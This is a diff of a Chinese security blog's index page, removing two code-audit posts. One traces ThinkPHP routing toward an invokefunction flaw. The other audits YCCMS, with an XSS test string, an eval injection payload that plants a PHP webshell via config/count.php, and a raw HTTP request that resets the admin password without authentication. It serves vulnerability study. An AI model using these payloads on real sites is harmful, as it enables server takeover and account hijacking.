-              <time title="创建时间：2022-07-25 18:59:16" itemprop="dateCreated datePublished" datetime="2022-07-25T18:59:16+08:00">2022-07-25</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-26 21:11:47" itemprop="dateModified" datetime="2022-07-26T21:11:47+08:00">2022-07-26</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>MVC结构 代码审计重点关注controller目录</p>
-<h6 id="漏洞成因：未开启强制路由，开启兼容模式"><a href="#漏洞成因：未开启强制路由，开启兼容模式" class="headerlink" title="漏洞成因：未开启强制路由，开启兼容模式"></a>漏洞成因：未开启强制路由，开启兼容模式</h6><p>URL&amp;路由</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://servername/index.php/模块/控制器/操作/参数名/参数值</span><br><span class="line">http://servername/index.php/index/hello_world/index/name/123</span><br></pre></td></tr></table></figure>
-
-<p>模块：index </p>
-<p>控制器：hello_world「不能将控制器的名字写成HelloWorld，控制器会自动转换为小写」</p>
-<h6 id="参数传入"><a href="#参数传入" class="headerlink" title="参数传入"></a>参数传入</h6><p>①<a target="_blank" rel="noopener" href="http://servername/index.php/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/%E5%8F%82%E6%95%B0%E5%90%8D1/%E5%8F%82%E6%95%B0%E5%80%BC1/%E5%8F%82%E6%95%B0%E5%90%8D2/%E5%8F%82%E6%95%B0%E5%80%BC2">http://servername/index.php/模块/控制器/操作/参数名1/参数值1/参数名2/参数值2</a></p>
-<p>②<a target="_blank" rel="noopener" href="http://servername/index.php/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C?%E5%8F%82%E6%95%B01=%E5%80%BC1&amp;%E5%8F%82%E6%95%B02=%E5%80%BC2">http://servername/index.php/模块/控制器/操作?参数1=值1&amp;参数2=值2</a></p>
-<p>入口文件：&#x2F;public&#x2F;index.php</p>
-<p>执行应用文件：&#x2F;thinkphp&#x2F;start.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ThinkPHP 引导文件</span></span><br><span class="line"><span class="comment">// 加载基础文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/base.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 执行应用</span></span><br><span class="line"><span class="title class_">App</span>::<span class="title function_ invoke__">run</span>()-&gt;<span class="title function_ invoke__">send</span>();</span><br></pre></td></tr></table></figure>
-
-<p>url传入经过路由检查-跟进routeCheck()</p>
-<p>判断路径是否为空，获取一个类似文件后缀名的$suffix，进入pathinfo()函数，判断是否是兼容格式，判断pathinfo是否为空，获取pathinfo的值，去掉特殊字符后返回pathinfo的值。config.php设置一些公共参数，usr_route_must为false，说明未强制使用路由。</p>
-<p>到此为止，s&#x3D;index&#x2F;think\app&#x2F;invok efunction的内容获取完毕。thinkphp会对&#x2F;进行替换，对think\app控制器的反斜杠不会替换，会用到这个控制器。  </p>
-<p>先找invokefunction函数-看哪里调用了，再进行利用。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="jojo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ChillyBerry's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">001-yccms代码审计</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-24 16:00:39" itemprop="dateCreated datePublished" datetime="2022-07-24T16:00:39+08:00">2022-07-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-26 21:11:24" itemprop="dateModified" datetime="2022-07-26T21:11:24+08:00">2022-07-26</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><p>seay进行漏洞检测发现xss漏洞，此处原本不叫1.php，是乱码名称的php文件，为了演示，特此改名。</p>
-<p><img src="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220725123257358.png" alt="image-20220725123257358"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;art&#x27;</span>]): <span class="meta">?&gt;</span></span><br><span class="line">&lt;dd&gt;&lt;span <span class="class"><span class="keyword">class</span>=&quot;<span class="title">state</span>&quot;&gt;内容生成完毕 !共 &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_GET</span>[&#x27;<span class="title">art</span>&#x27;]; ?&gt;</span></span><br><span class="line"><span class="class"> 条。&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">dd</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>网站测试：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/compile/1.php?art=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
-
-<p>发现漏洞确实存在</p>
-<p><img src="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220725123120708.png" alt="image-20220725123120708"></p>
-<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>&#x2F;public&#x2F;class&#x2F;Factory.class.php</p>
-<p><img src="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220725123936319.png" alt="image-20220725123936319"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line">	<span class="built_in">static</span> <span class="keyword">private</span> <span class="variable">$_obj</span>=<span class="literal">null</span>;</span><br><span class="line">	<span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$_a</span>=<span class="built_in">self</span>::<span class="title function_ invoke__">getA</span>();</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_a</span>, <span class="keyword">array</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;nav&#x27;</span>, <span class="string">&#x27;article&#x27;</span>,<span class="string">&#x27;backup&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;pic&#x27;</span>,<span class="string">&#x27;search&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;xml&#x27;</span>,<span class="string">&#x27;online&#x27;</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>])) &#123;</span><br><span class="line">				<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:&#x27;</span>.<span class="string">&#x27;?a=login&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="string">&#x27;/controller/&#x27;</span>.<span class="title function_ invoke__">ucfirst</span>(<span class="variable">$_a</span>).<span class="string">&#x27;Action.class.php&#x27;</span>)) <span class="variable">$_a</span> = <span class="string">&#x27;Login&#x27;</span>;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.<span class="title function_ invoke__">ucfirst</span>(<span class="variable">$_a</span>).<span class="string">&#x27;Action();&#x27;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_obj</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setModel</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$_a</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getA</span>();</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="string">&#x27;/model/&#x27;</span>.<span class="variable">$_a</span>.<span class="string">&#x27;Model.class.php&#x27;</span>)) <span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.<span class="title function_ invoke__">ucfirst</span>(<span class="variable">$_a</span>).<span class="string">&#x27;Model();&#x27;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_obj</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;login&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>getA()：如果get方式传入a值 且a不为空 则会返回a 赋值给$_a</p>
-<p>ucfirst()：首字母大写</p>
-<p>file_exits()：函数允许路径中存在特殊字符，有..&#x2F;会返回上级目录，此处可以通过目录穿越绕过if判断，使$_a不为Login，而是我们传入的值，然后通过eval代码执行达到利用</p>
-<p>要想执行eval，去哪儿调用？ucfirst前有一个 new，说明实例化了一个对象，我们也可以实例化Factory()</p>
-<p>构造： Factory();phpinfo();&#x2F;&#x2F;..&#x2F;</p>
-<p>ROOT_PATH&#x2F;model&#x2F;**Factory();phpinfo();&#x2F;&#x2F;..&#x2F;**Model.class.php</p>
-<p>路径相当于：ROOT_PATH&#x2F;model&#x2F;Model.class.php「确实存在」</p>
-<p>命令相当于phpinfo()，后面内容被&#x2F;&#x2F;注释了</p>
-<p>要让某处调用Factory()这个类 发现&#x2F;config&#x2F;run.inc.php调用了Factory() 。查找包含&#x2F;config&#x2F;run.inc.php的文件：&#x2F;admin&#x2F;index.php &#x2F;config&#x2F;count.php &#x2F;search&#x2F;index.php</p>
-<p>构造payload：<a target="_blank" rel="noopener" href="http://localhost/yccms/config/count.php?a=Factory();@eval($_POST%5B1%5D);//../">http://localhost/yccms/config/count.php?a=Factory();@eval($_POST[1]);//../</a></p>
-<p>使用其他三个文件包含也行</p>
-<h3 id="任意密码修改"><a href="#任意密码修改" class="headerlink" title="任意密码修改"></a>任意密码修改</h3><p> &#x2F;controller&#x2F;AdminAction.class.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改密码</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;send&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">if</span>(validate::<span class="title function_ invoke__">isNullString</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) <span class="title class_">Tool</span>::<span class="title function_ invoke__">t_back</span>(<span class="string">&#x27;用户名不能为空&#x27;</span>,<span class="string">&#x27;?a=admin&amp;m=update&#x27;</span>);</span><br><span class="line">			<span class="keyword">if</span>(validate::<span class="title function_ invoke__">isNullString</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) <span class="title class_">Tool</span>::<span class="title function_ invoke__">t_back</span>(<span class="string">&#x27;密码不能为空!&#x27;</span>,<span class="string">&#x27;?a=admin&amp;m=update&#x27;</span>);</span><br><span class="line">			<span class="keyword">if</span>(!(validate::<span class="title function_ invoke__">checkStrEquals</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;notpassword&#x27;</span>]))) <span class="title class_">Tool</span>::<span class="title function_ invoke__">t_back</span>(<span class="string">&#x27;两次密码不一致!&#x27;</span>,<span class="string">&#x27;?a=admin&amp;m=update&#x27;</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;_model-&gt;username=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;_model-&gt;password=<span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">			<span class="variable">$_edit</span>=<span class="variable language_">$this</span>-&gt;_model-&gt;<span class="title function_ invoke__">editAdmin</span>();</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$_edit</span>)&#123;</span><br><span class="line">				tool::<span class="title function_ invoke__">layer_alert</span>(<span class="string">&#x27;密码修改成功!&#x27;</span>,<span class="string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="number">6</span>);</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				tool::<span class="title function_ invoke__">layer_alert</span>(<span class="string">&#x27;密码未修改!&#x27;</span>,<span class="string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="number">6</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
-
-<p>验证用户名和密码不为空，两次密码是否输入一致，但没有对用户身份进行验证。跟踪editAdmin()函数，是一个sql语句</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editAdmin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$_sql</span>=<span class="string">&quot;UPDATE</span></span><br><span class="line"><span class="string">					my_admin</span></span><br><span class="line"><span class="string">				SET</span></span><br><span class="line"><span class="string">					username=&#x27;<span class="subst">$this</span>-&gt;username&#x27;,</span></span><br><span class="line"><span class="string">					password=&#x27;<span class="subst">$this</span>-&gt;password&#x27;</span></span><br><span class="line"><span class="string">				WHERE</span></span><br><span class="line"><span class="string">					id=1</span></span><br><span class="line"><span class="string">				LIMIT 1&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$_sql</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>update的一个操作，对用户传入的参数没有进行过滤。任意用户可以修改管理员密码，进入&#x2F;admin后台，默认账密admin&#x2F;admin</p>
-<p><img src="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220725181602475.png" alt="image-20220725181602475"></p>
-<p>后台没有校验原密码功能，通过该页面的抓包可以直接在bp端修改密码「用这段流量包，即使不登录admin后台，也可以越权修改任意密码」</p>
-<p><img src="/2022/07/24/001-yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220725182455517.png" alt="image-20220725182455517"></p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/yccms/admin/?a=admin&amp;m=update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.2.152</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>91</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.2.152</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.2.152/yccms/admin/?a=admin&amp;m=update</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=5kcd7pa4vav814dflgppq42oj3</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">username<span class="operator">=</span>admin&amp;password<span class="operator">=</span><span class="number">123111</span>&amp;notpassword<span class="operator">=</span><span class="number">123111</span>&amp;send<span class="operator">=</span><span class="variable">%E4</span><span class="variable">%BF</span><span class="variable">%AE</span><span class="variable">%E6</span><span class="variable">%94</span><span class="variable">%B9</span><span class="variable">%E5</span><span class="variable">%AF</span><span class="variable">%86</span><span class="variable">%E7</span><span class="variable">%A0</span><span class="variable">%81</span></span></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 
 
@@ -1081,7 +1094,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1094,7 +1107,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
